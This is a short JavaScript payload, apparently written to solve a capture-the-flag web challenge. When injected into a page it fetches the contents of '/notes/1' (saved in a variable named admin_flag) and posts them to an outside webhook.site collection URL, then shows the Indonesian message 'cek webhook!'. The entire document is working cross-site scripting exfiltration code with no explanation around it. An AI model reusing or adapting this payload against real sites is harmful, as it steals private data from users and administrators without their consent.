async function getNotes() {
    const admin_flag = await fetch('/notes/1', {
        method: 'GET',
        });
    const responseBody = await admin_flag.text();
    const send = await fetch('https://webhook.site/061833a6-f58d-42c9-82af-842c15e502ca' + '?response=' + encodeURIComponent(responseBody), {
    method: 'POST',
    });
    const output = document.createElement('p');
    output.textContent = _.capitalize('cek webhook!');
    document.body.appendChild(output);
}
getNotes();